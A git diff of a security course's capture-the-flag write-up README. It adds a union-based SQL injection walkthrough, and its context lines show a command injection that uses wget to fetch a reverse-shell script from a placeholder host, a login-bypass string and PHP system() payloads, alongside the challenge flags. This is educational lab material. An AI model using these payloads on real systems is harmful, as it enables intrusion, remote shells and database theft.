@@ -1,7 +1,7 @@
 # NCTU.108-1.program-security
 
 ## [Lab 0x01] What The Hell
-`rev, 50 pts` `FLAG{BABY_REVERSE_123}`
+`rev` `50 pts` `FLAG{BABY_REVERSE_123}`
 
 > 跟地獄世界打招呼，摸摸找找 Flag 在哪。
 > 
@@ -19,7 +19,7 @@
 
 
 ## [0x01] Back to the Future
-`rev, 50 pts` `FLAG{PE_!S_EASY}`
+`rev` `50 pts` `FLAG{PE_!S_EASY}`
 
 > 一九八五年科學家聖豪成功在實驗室研製了軟體時光機，並將開發時光機的「核心機密」埋藏在時光機軟體中。
 >
@@ -35,7 +35,7 @@
 
 
 ## [0x02] IDAmudamudamuda
-`rev, 100 pts` `FLAG{y3s!!y3s!!y3s!!0h_my_g0d!!}`
+`rev` `100 pts` `FLAG{y3s!!y3s!!y3s!!0h_my_g0d!!}`
 
 > ShengHao’s HW1 was too kind, try this.
 > 
@@ -141,7 +141,7 @@ We know `unk_5D4018`, and we can just reverse the calculation and get the flag.
 
 
 ## [Lab 0x03] sushi
-`web, 50 pts` `FLAG{HaoChihDeSuSiZaiJhengSian}`
+`web` `50 pts` `FLAG{HaoChihDeSuSiZaiJhengSian}`
 
 > 好ㄘ的蘇洗宰爭先
 > 
@@ -177,7 +177,7 @@ But we can access the file directly through `https://edu-ctf.csie.org:10152/flag
 
 
 ## [Lab 0x03] me0w
-`web, 50 pts` `FLAG{me0w!m3ow!meow!}`
+`web` `50 pts` `FLAG{me0w!m3ow!meow!}`
 
 > 喵🐱🐈
 > 
@@ -212,7 +212,7 @@ https://edu-ctf.csie.org:10153/?me0w=index.php%0awget%20<ip>:<port1>/revshell.sh
 
 
 ## [Lab 0x03] No Password
-`web, 50 pts` `FLAG{baby_first_sqlinj}`
+`web` `50 pts` `FLAG{baby_first_sqlinj}`
 
 > Login as admin!
 > 
@@ -223,7 +223,7 @@ Both username and password input `a" or "a"="a`.
 
 
 ## [0x03] Unexploitable
-`web, 100 pts` `FLAG{baby_recon_dont_forget_to_look_github_page}`
+`web` `100 pts` `FLAG{baby_recon_dont_forget_to_look_github_page}`
 
 > Exploit the unexploitable!
 > 
@@ -257,7 +257,7 @@ The flag is in the file.
 
 
 ## [0x03] Safe R/W
-`web, 200 pts` `FLAG{w3lc0me_t0_th3_PHP_W0r1d}`
+`web` `200 pts` `FLAG{w3lc0me_t0_th3_PHP_W0r1d}`
 
 > I implemented the safest php file reader/writer!
 > 
@@ -274,3 +274,43 @@ We send normal and illegal payload at the same time to trigger race condition.
 $ ./race.py | $ ./race.py '<?php system("ls -al /")'
 $ ./race.py | $ ./race.py '<?php system("cat /flag_is_here")'
 ```
+
+
+## [Lab 0x04] EasyPeasy
+`web` `50 pts` `FLAG{union_based_sqlinj_is_sooooooooo_easy}`
+
+> Try your first Union-based SQL Injection!
+> 
+> [Link](https://edu-ctf.csie.org:10158/)
+
+Use `1 and 2=2` to verify that this SQLi is number type.
+Use `order by` to find out the number of columns.
+Use `union select` to know which columns will be shown on the web page.
+
+```
+https://edu-ctf.csie.org:10158/news.php?id=1 and 2=2
+https://edu-ctf.csie.org:10158/news.php?id=1 order by 3
+https://edu-ctf.csie.org:10158/news.php?id=-1 union select 1,2,3
+```
+
+Find all information we need.
+
+```
+# show databases
+https://edu-ctf.csie.org:10158/news.php?id=-1%20union%20select%201,2,GROUP_CONCAT(schema_name)%20from%20information_schema.schemata
+/* information_schema,fl4g,mysql,news,test */
+
+# show tables of fl4g
+https://edu-ctf.csie.org:10158/news.php?id=-1%20union%20select%201,2,GROUP_CONCAT(table_name)%20from%20information_schema.tables%20where%20table_schema=%27fl4g%27
+/* secret */
+
+# show columns of fl4g.secret
+https://edu-ctf.csie.org:10158/news.php?id=-1%20union%20select%201,2,GROUP_CONCAT(column_name)%20from%20information_schema.columns%20where%20table_name=%27secret%27
+/* id,THIS_IS_FLAG_YO */
+
+# dump data in fl4g.secret.THIS_IS_FLAG_YO
+https://edu-ctf.csie.org:10158/news.php?id=-1%20union%20select%201,2,THIS_IS_FLAG_YO%20from%20fl4g.secret
+/* FLAG{union_based_sqlinj_is_sooooooooo_easy} */
+```
+
+
